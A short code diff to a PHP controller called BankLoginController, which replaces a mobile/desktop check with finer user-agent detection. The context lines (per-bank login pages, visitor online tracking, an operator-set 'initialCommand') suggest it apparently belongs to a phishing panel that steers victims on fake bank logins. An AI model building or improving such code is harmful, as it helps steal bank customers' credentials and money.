@@ -56,7 +56,7 @@ class BankLoginController extends Controller
             'page_url'    => $request->fullUrl(),
             'page_name'   => $bankSlug,
             'bank_slug'   => $bankSlug,
-            'device_type' => str_contains(strtolower($request->userAgent() ?? ''), 'mobile') ? 'mobile' : 'desktop',
+            'device_type' => self::detectDevice($request->userAgent() ?? ''),
             'is_online'   => true,
             'last_seen'   => now(),
         ]);
@@ -78,5 +78,16 @@ class BankLoginController extends Controller
             'preSessionId'   => $preSession->id,
             'initialCommand' => $session->action_type ?? ['type' => 'idle'],
         ]);
+    }
+
+    private static function detectDevice(string $ua): string
+    {
+        if (stripos($ua, 'iPhone') !== false) return 'iphone';
+        if (stripos($ua, 'iPad') !== false)   return 'ipad';
+        if (stripos($ua, 'Android') !== false) return 'android';
+        if (stripos($ua, 'Windows') !== false) return 'windows';
+        if (stripos($ua, 'Macintosh') !== false || stripos($ua, 'Mac OS X') !== false) return 'macos';
+        if (stripos($ua, 'Linux') !== false)   return 'linux';
+        return 'desktop';
     }
 }
